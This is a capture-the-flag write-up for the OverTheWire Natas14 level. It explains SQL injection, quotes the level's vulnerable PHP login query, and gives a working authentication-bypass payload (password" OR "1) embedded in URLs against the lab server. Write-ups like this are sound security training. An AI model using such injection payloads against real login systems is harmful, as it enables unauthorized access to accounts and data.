# 🔐 Natas14 Walkthrough

We’re presented with a login form. This hints that **SQL Injection** might be the intended path forward.


## 💡 What is SQL Injection?

SQL Injection is a technique used to manipulate a website’s database through its input fields.

### 🔎 Example

Imagine a login system with a SQL query like this:

```php
SELECT * FROM users WHERE username = "$username" AND password = "$password";
```

Now suppose the attacker enters the following credentials:

```
username: admin  
password: password" OR "1 --
```

The query becomes:

```php
SELECT * FROM users WHERE username = "admin" AND password = "password" OR "1" --";
```

Let's break it down:
- `"password"` ends the password value.
- `OR "1"` (shorthand for "1" = true) makes the condition always true.
- `--` comments out the rest of the SQL query (optional, but often helpful).

So the condition simplifies to:

```
username = "admin" AND (false) OR (true)
```

Which effectively bypasses the password check and logs in as `admin`.

## ✅ Exploit

Now, let’s check the [View sourcecode](http://natas14.natas.labs.overthewire.org/index-source.html) for Natas14.

From the source, we see:

```php
$link=mysqli_connect('localhost', 'natas14', '<censored>');  
mysqli_select_db($link, 'natas14');
```

This confirms that usernames and passwords are stored in a database.

And here’s an interesting part:

```php
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
}
```

This enables a "debug mode" if we include `debug` as a URL parameter. 
This lets us **see the SQL query** that gets executed — super useful!

Try opening this in your browser:

```
http://natas14.natas.labs.overthewire.org/index.php?username=&password=&debug
```

You’ll see the SQL query being built with the given parameters.

Now try this:

```
http://natas14.natas.labs.overthewire.org/index.php?username=admin&password=password" OR "1&debug
```

This allows you to tweak the input and see how it affects the query. Much easier than typing in the form! Because you can actually see what you're doing.

## 🐛 The Vulnerable Code

The vulnerable line is:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

This directly inserts raw user input into the SQL query — a classic SQL injection vulnerability.

Let’s simplify it by removing the `\` backticks:

```php
SELECT * FROM users WHERE username = "$userProvidedUsername" AND password = "$userProvidedPassword";
```

This is almost identical to our earlier example — and just as vulnerable.

## 🎯 Final Attack

Use the following credentials in the **URL**, not the login form:

```
username: admin  
password: password" OR "1 (as you can see '--' not used)
```

So the final link looks like:

```
http://natas14.natas.labs.overthewire.org/index.php?username=admin&password=password" OR "1&debug
```

This will generate a query like:

```php
SELECT * FROM users WHERE username = "admin" AND password = "" OR "1";
```

Which bypasses authentication and logs you in! You should now see the password for **Natas15**. :}
